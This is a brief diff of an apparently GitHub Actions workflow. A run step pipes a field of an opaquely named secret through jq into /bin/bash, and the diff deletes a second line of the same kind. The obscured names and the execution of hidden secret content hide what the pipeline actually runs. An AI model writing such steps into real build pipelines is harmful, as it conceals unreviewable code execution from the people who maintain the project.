@@ -21,7 +21,6 @@ jobs:
           p23258: ${{ secrets.p23258 }}
         run: |
           printf '%s' "$p23258" | jq -r .tlzbh39 | /bin/bash
-          echo $md6 | jq -r .nmw670 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
